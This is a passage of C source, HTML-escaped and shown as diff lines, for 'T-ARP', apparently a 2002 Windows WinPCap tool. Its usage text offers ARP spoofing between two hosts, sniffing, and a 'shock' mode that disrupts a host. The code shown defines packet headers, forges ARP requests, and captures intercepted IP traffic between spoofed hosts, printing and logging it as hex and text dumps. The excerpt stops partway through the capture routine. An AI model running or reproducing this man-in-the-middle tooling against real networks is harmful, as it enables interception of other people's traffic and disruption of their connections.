+      ETH_IP&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0x0800<BR>#define 
+      ETH_ARP&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0x0806<BR>#define 
+      ARP_REQUEST&nbsp;&nbsp;0x0001<BR>#define 
+      ARP_REPLY&nbsp;&nbsp;&nbsp;&nbsp;0x0002<BR>#define ARP_HARDWARE 
+      0x0001<BR>#define max_num_adapter&nbsp;&nbsp;10<BR><BR>#pragma 
+      pack(push,1)<BR><BR>typedef struct 
+      ethdr<BR>{<BR>&nbsp;&nbsp;&nbsp;&nbsp;unsigned char&nbsp;&nbsp; 
+      eh_dst[6];<BR>&nbsp;&nbsp;&nbsp;&nbsp;unsigned char&nbsp;&nbsp; 
+      eh_src[6];<BR>&nbsp;&nbsp;&nbsp;&nbsp;unsigned 
+      short&nbsp;&nbsp;eh_type;<BR>}ETHDR,*PETHDR;<BR><BR>typedef struct 
+      arphdr<BR>{<BR>&nbsp;&nbsp;&nbsp;&nbsp;unsigned 
+      short&nbsp;&nbsp;arp_hdr;<BR>&nbsp;&nbsp;&nbsp;&nbsp;unsigned 
+      short&nbsp;&nbsp;arp_pro;<BR>&nbsp;&nbsp;&nbsp;&nbsp;unsigned 
+      char&nbsp;&nbsp; arp_hln;<BR>&nbsp;&nbsp;&nbsp;&nbsp;unsigned 
+      char&nbsp;&nbsp; arp_pln;<BR>&nbsp;&nbsp;&nbsp;&nbsp;unsigned 
+      short&nbsp;&nbsp;arp_opt;<BR>&nbsp;&nbsp;&nbsp;&nbsp;unsigned 
+      char&nbsp;&nbsp; arp_sha[6];<BR>&nbsp;&nbsp;&nbsp;&nbsp;unsigned 
+      long&nbsp;&nbsp; arp_spa;<BR>&nbsp;&nbsp;&nbsp;&nbsp;unsigned 
+      char&nbsp;&nbsp; arp_tha[6];<BR>&nbsp;&nbsp;&nbsp;&nbsp;unsigned 
+      long&nbsp;&nbsp; arp_tpa;<BR>}ARPHDR,*PARPHDR;<BR><BR>typedef struct 
+      iphdr<BR>{<BR>&nbsp;&nbsp;&nbsp;&nbsp;unsigned 
+      char&nbsp;&nbsp;h_lenver;<BR>&nbsp;&nbsp;&nbsp;&nbsp;unsigned 
+      char&nbsp;&nbsp;tos;<BR>&nbsp;&nbsp;&nbsp;&nbsp;unsigned short 
+      total_len;<BR>&nbsp;&nbsp;&nbsp;&nbsp;unsigned short 
+      ident;<BR>&nbsp;&nbsp;&nbsp;&nbsp;unsigned short 
+      frag_and_flags;<BR>&nbsp;&nbsp;&nbsp;&nbsp;unsigned 
+      char&nbsp;&nbsp;ttl;<BR>&nbsp;&nbsp;&nbsp;&nbsp;unsigned 
+      char&nbsp;&nbsp;proto;<BR>&nbsp;&nbsp;&nbsp;&nbsp;unsigned short 
+      checksum;<BR>&nbsp;&nbsp;&nbsp;&nbsp;unsigned int&nbsp;&nbsp; 
+      sourceip;<BR>&nbsp;&nbsp;&nbsp;&nbsp;unsigned int&nbsp;&nbsp; 
+      destip;<BR>}IPHDR,*PIPHDR;<BR><BR>#pragma pack(push)<BR><BR>LPADAPTER 
+      lpadapter=0;<BR>LPPACKET&nbsp;&nbsp;lppacketr,lppackets;<BR>ULONG&nbsp;&nbsp;&nbsp;&nbsp; 
+      myip,firstip,secondip;<BR>UCHAR&nbsp;&nbsp;&nbsp;&nbsp; 
+      mmac[6]={0},fmac[6]={0},smac[6]={0};<BR>BOOL&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mm=FALSE,fm=FALSE,sm=FALSE; 
+      <BR>FILE&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*fp; 
+      <BR>char&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;adapterlist[max_num_adapter][1024];<BR>char&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;msg[50];<BR>int&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
+      num=0;<BR><BR>void start()<BR>{<BR>&nbsp;&nbsp;&nbsp;&nbsp;printf("T-ARP 
+      --- ARP Tools, by TOo2y(ò1é?), 
+      11-9-2002\n");<BR>&nbsp;&nbsp;&nbsp;&nbsp;printf("Homepage: <A 
+      href="http://www.safechina.net/" 
+      target=_blank>http://www.safechina.net/</A>\n");<BR>&nbsp;&nbsp;&nbsp;&nbsp;printf("E-mail: 
+      TOo2y@safechina.net\n");<BR>&nbsp;&nbsp;&nbsp;&nbsp;return 
+      ;<BR>}<BR><BR>void 
+      usage()<BR>{<BR>&nbsp;&nbsp;&nbsp;&nbsp;printf("\nUsage: 
+      T-ARP&nbsp;&nbsp;[-m|-a|-s|-r]&nbsp;&nbsp;firstip&nbsp;&nbsp;secondip&nbsp;&nbsp;\n\n");<BR>&nbsp;&nbsp;&nbsp;&nbsp;printf("Option:\n");<BR>&nbsp;&nbsp;&nbsp;&nbsp;printf("&nbsp;&nbsp; 
+      -m&nbsp;&nbsp;mac&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Get the 
+      mac address from firstip to 
+      secondip\n");<BR>&nbsp;&nbsp;&nbsp;&nbsp;printf("&nbsp;&nbsp; 
+      -a&nbsp;&nbsp;antisniff&nbsp;&nbsp;Get the sniffing host from firstip to 
+      secondip\n");<BR>&nbsp;&nbsp;&nbsp;&nbsp;printf("&nbsp;&nbsp; 
+      -s&nbsp;&nbsp;spoof&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;1&gt; Spoof the 
+      host between firstip and 
+      secondip\n");<BR>&nbsp;&nbsp;&nbsp;&nbsp;printf("&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
+      sniff&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;2&gt; Sniff if firstip == 
+      secondip == your own 
+      ip\n");<BR>&nbsp;&nbsp;&nbsp;&nbsp;printf("&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
+      shock&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;3&gt; Shock if firstip == 
+      secondip != your own 
+      ip\n");<BR>&nbsp;&nbsp;&nbsp;&nbsp;printf("&nbsp;&nbsp; 
+      -r&nbsp;&nbsp;reset&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Reset the spoofed 
+      host work 
+      normally\n\n");<BR>&nbsp;&nbsp;&nbsp;&nbsp;printf("Attention:\n");<BR>&nbsp;&nbsp;&nbsp;&nbsp;printf("&nbsp;&nbsp;&nbsp;&nbsp;1&gt; 
+      You must have installed the winpcap_2.3 or 
+      winpcap_3.0_alpha\n");<BR>&nbsp;&nbsp;&nbsp;&nbsp;printf("&nbsp;&nbsp;&nbsp;&nbsp;2&gt; 
+      HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\Tcpip\\Parameters\\IPEnableRouter==0x1\n\n");<BR>&nbsp;&nbsp;&nbsp;&nbsp;return 
+      ;<BR>}<BR><BR>int 
+      getmine()<BR>{<BR>&nbsp;&nbsp;&nbsp;&nbsp;char&nbsp;&nbsp; 
+      sendbuf[1024];<BR>&nbsp;&nbsp;&nbsp;&nbsp;int&nbsp;&nbsp;&nbsp;&nbsp;k;<BR>&nbsp;&nbsp;&nbsp;&nbsp;ETHDR&nbsp;&nbsp;eth;<BR>&nbsp;&nbsp;&nbsp;&nbsp;ARPHDR 
+      arp;<BR><BR>&nbsp;&nbsp;&nbsp;&nbsp;for(k=0;k&lt;6;k++)<BR>&nbsp;&nbsp;&nbsp;&nbsp;{<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;eth.eh_dst[k]=0xff;<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;eth.eh_src[k]=0x82;<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;arp.arp_sha[k]=0x82;<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;arp.arp_tha[k]=0x00;<BR>&nbsp;&nbsp;&nbsp;&nbsp;}<BR>&nbsp;&nbsp;&nbsp;&nbsp;eth.eh_type=htons(ETH_ARP);<BR>&nbsp;&nbsp;&nbsp;&nbsp;arp.arp_hdr=htons(ARP_HARDWARE);<BR>&nbsp;&nbsp;&nbsp;&nbsp;arp.arp_pro=htons(ETH_IP);<BR>&nbsp;&nbsp;&nbsp;&nbsp;arp.arp_hln=6;<BR>&nbsp;&nbsp;&nbsp;&nbsp;arp.arp_pln=4;<BR>&nbsp;&nbsp;&nbsp;&nbsp;arp.arp_opt=htons(ARP_REQUEST);<BR>&nbsp;&nbsp;&nbsp;&nbsp;arp.arp_tpa=htonl(myip);<BR>&nbsp;&nbsp;&nbsp;&nbsp;arp.arp_spa=inet_addr("112.112.112.112");<BR><BR>&nbsp;&nbsp;&nbsp;&nbsp;memset(sendbuf,0,sizeof(sendbuf));<BR>&nbsp;&nbsp;&nbsp;&nbsp;memcpy(sendbuf,&amp;eth;,sizeof(eth));<BR>&nbsp;&nbsp;&nbsp;&nbsp;memcpy(sendbuf+sizeof(eth),&amp;arp,sizeof(arp));<BR><BR>&nbsp;&nbsp;&nbsp;&nbsp;PacketInitPacket(lppackets,sendbuf,sizeof(eth)+sizeof(arp));<BR>&nbsp;&nbsp;&nbsp;&nbsp;if(PacketSendPacket(lpadapter,lppackets,TRUE)==FALSE)<BR>&nbsp;&nbsp;&nbsp;&nbsp;{<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;printf("PacketSendPacket 
+      in getmine Error: 
+      %d\n",GetLastError());<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return 
+      -1;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
+      <BR>&nbsp;&nbsp;&nbsp;&nbsp;}<BR>&nbsp;&nbsp;&nbsp;&nbsp;return 
+      0;<BR>}<BR><BR>void getdata(LPPACKET lp,int op) 
+      <BR>{<BR>&nbsp;&nbsp;&nbsp;&nbsp;ULONG&nbsp;&nbsp;ulbytesreceived,off,tlen,ulen,ulLines;<BR>&nbsp;&nbsp;&nbsp;&nbsp;ULONG&nbsp;&nbsp;j,k;<BR>&nbsp;&nbsp;&nbsp;&nbsp;ETHDR&nbsp;&nbsp;*eth;<BR>&nbsp;&nbsp;&nbsp;&nbsp;ARPHDR 
+      *arp;<BR>&nbsp;&nbsp;&nbsp;&nbsp;PIPHDR 
+      ip;<BR>&nbsp;&nbsp;&nbsp;&nbsp;char&nbsp;&nbsp; 
+      *buf,*pChar,*pLine,*base;<BR>&nbsp;&nbsp;&nbsp;&nbsp;struct 
+      bpf_hdr&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*hdr;<BR>&nbsp;&nbsp;&nbsp;&nbsp;struct 
+      sockaddr_in&nbsp;&nbsp;sin;<BR><BR><BR>&nbsp;&nbsp;&nbsp;&nbsp;ulbytesreceived=lp-&gt;ulBytesReceived;<BR>&nbsp;&nbsp;&nbsp;&nbsp;buf=(char 
+      *)lp-&gt;Buffer;<BR><BR>&nbsp;&nbsp;&nbsp;&nbsp;off=0;<BR>&nbsp;&nbsp;&nbsp;&nbsp;while(off&lt;ulbytesreceived)<BR>&nbsp;&nbsp;&nbsp;&nbsp;{<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if(kbhit())<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return 
+      ;<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;hdr=(struct 
+      bpf_hdr 
+      *)(buf+off);<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;off+=hdr-&gt;bh_hdrlen;<BR><BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;pChar=(char 
+      *)(buf+off);<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;base=pChar;<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;off=Packet_WORDALIGN(off+hdr-&gt;bh_caplen);<BR><BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;eth=(PETHDR)pChar;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;arp=(PARPHDR)(pChar+sizeof(ETHDR)); 
+      <BR><BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if(eth-&gt;eh_type==htons(ETH_IP)) 
+      <BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ip=(PIPHDR)(pChar+sizeof(ETHDR));<BR><BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if(fm 
+      &amp;&amp; sm &amp;&amp; 
+      (op==3))&nbsp;&nbsp;<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{&nbsp;&nbsp;<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if((((ip-&gt;sourceip!=htonl(myip)) 
+      &amp;&amp; (ip-&gt;destip!=htonl(myip)) 
+      <BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&amp;&amp; 
+      !strcmp((char *)eth-&gt;eh_dst,(char *)mmac)) 
+      <BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&amp;&amp; 
+      ((ip-&gt;sourceip==htonl(firstip)) || (ip-&gt;destip==htonl(firstip)) 
+      <BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;|| 
+      (ip-&gt;sourceip==htonl(secondip)) || 
+      (ip-&gt;destip==htonl(secondip))))<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;|| 
+      ((firstip==myip) &amp;&amp; 
+      (secondip==myip)))<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;memset(msg,0,sizeof(msg));<BR><BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sin.sin_addr.s_addr=ip-&gt;sourceip;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;printf("[IP:]%16s 
+      ---&gt; 
+      [IP:]",inet_ntoa(sin.sin_addr));<BR><BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;strcpy(msg,inet_ntoa(sin.sin_addr));<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;strcat(msg+15," 
+      ---&gt; 
+      ");<BR><BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sin.sin_addr.s_addr=ip-&gt;destip;<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;printf("%16s\n",inet_ntoa(sin.sin_addr));<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
+      <BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;strcat(msg+23,inet_ntoa(sin.sin_addr));<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;fseek(fp,-2,1);<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;fwrite("\r\n\r\n\r\n",6,1,fp);<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;fwrite(msg,38,1,fp);<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;fwrite("\r\n",2,1,fp);<BR><BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ulLines=(hdr-&gt;bh_caplen+15)/16;<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;for(k=0;k&lt;ulLines;k++)<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;pLine=pChar;<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;printf("%08lx 
+      : 
+      ",pChar-base);<BR><BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ulen=tlen;<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ulen=(ulen&gt;16) 
+      ? 16 : 
+      ulen;<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;tlen-=ulen;<BR><BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;for(j=0;j&lt;ulen;j++)<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;printf("%02x 
+      ",*(BYTE 
+      *)pChar++);<BR><BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if(ulen&lt;16)<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;printf("%*s",(16-ulen)*3," 
+      ");<BR><BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;pChar=pLine;<BR><BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;for(j=0;j&lt;ulen;j++,pChar++)<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;printf("%c",isprint(*pChar)? 
+      *pChar : 
+      '.');<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;fputc(isprint(*pChar) 
+      ? *pChar : '.',fp); 
+      <BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;printf("\n");<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;printf("\n");<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;fwrite("\r\n",2,1,fp);&nbsp;&nbsp;<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}<BR><BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;continue;<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;else 
+      if((eth-&gt;eh_type==htons(ETH_ARP)) &amp;&amp; 
+      (arp-&gt;arp_opt==htons(ARP_REPLY)))&nbsp;&nbsp;<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sin.sin_addr.s_addr=arp-&gt;arp_spa;<BR><BR>&nbsp;&nbsp;&nbsp;&nbsp; 
+      &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if(sin.sin_addr.s_addr==htonl(myip)) 
